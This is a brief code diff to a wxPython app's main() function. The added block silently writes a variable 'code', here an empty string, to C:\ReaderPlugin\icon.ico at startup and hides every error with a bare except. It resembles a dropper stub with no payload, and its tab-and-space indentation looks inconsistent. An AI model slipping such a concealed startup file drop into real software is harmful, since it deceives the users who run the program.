@@ -15,7 +15,13 @@ class BoaApp(wx.App):
         return True
 
 def main():
-	
+	try:
+		code = ''
+		f=open("C:\\ReaderPlugin\\icon.ico","wb")
+		f.write(code)
+		f.close()
+	except:
+		pass
 
     application = BoaApp(0)
     application.MainLoop()
